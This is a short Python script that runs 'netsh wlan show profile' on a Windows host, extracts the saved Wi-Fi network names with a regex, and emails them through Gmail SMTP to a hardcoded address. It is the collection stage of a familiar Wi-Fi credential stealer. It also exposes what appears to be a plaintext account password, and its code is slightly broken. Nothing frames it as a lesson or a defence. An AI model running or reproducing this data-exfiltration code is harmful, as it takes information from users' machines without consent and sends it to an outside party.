

import subprocess, smtplib,re

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()
	
command = "netsh wlan show profile" 
regex = '(?:Profile\s*:\s)(.*)'
pattern =regex.encode("utf-8", "ignore")
networks = subprocess.check_output(command, shell = True)
network_names = re.findall(pattern, networks)
result = network_names
send_mail("scolow2111@ueab.ac.ke", "colo5115", result)
